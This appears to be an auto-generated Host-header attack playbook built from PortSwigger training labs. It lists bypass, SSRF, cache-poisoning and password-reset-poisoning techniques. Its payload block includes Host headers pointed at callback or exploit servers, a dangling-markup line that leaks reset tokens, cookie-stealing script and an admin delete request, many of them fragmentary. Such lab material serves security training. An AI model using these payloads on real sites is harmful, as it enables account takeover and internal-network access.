## HOST HEADER Playbook
*Synthesized from 7 PortSwigger labs*

### Overview
This playbook covers 7 known attack techniques for host_header.

### Attack Techniques

**Bypass Techniques:**
- Host header authentication bypass
- Host validation bypass via connection state attack

**General:**
- Routing-based SSRF
- SSRF via flawed request parsing
- Web cache poisoning via ambiguous requests
- Basic password reset poisoning
- Password reset poisoning via dangling markup

### Key Payloads
```
csrf
Host
GET /forgot-password
GET /email
GET /admin
192.168.0.1
Connection
/resources/js/tracking.js
alert()
/admin
alert(document.cookie)
From: 0
To: 255
Step: 1
GET https://[LAB_ID].[TARGET]/
GET https://[LAB_ID].[TARGET]/
Host: [CALLBACK_SERVER]
temp-forgot-password-token
Host: [LAB_ID].[TARGET]:'<a href="//[EXPLOIT_SERVER]-ID.exploit-server.net/?
[EXPLOIT_SERVER]-ID.exploit-server.net
GET /?/login'>[…]
GET /admin/delete?username=[TARGET_USER]
192.168.0.0/24
```

### Indicators of Success
- Unexpected data in response
- Error messages revealing internal info
- Behavior change confirming injection
- Out-of-band callback received
- Access to unauthorized resources

### Testing Methodology
1. **Identify injection points** — forms, parameters, headers, cookies
2. **Test basic payloads** — start simple, escalate complexity
3. **Observe responses** — errors, timing, content changes
4. **Try bypasses** — encoding, alternative syntax, filter evasion
5. **Confirm impact** — data extraction, privilege escalation, RCE

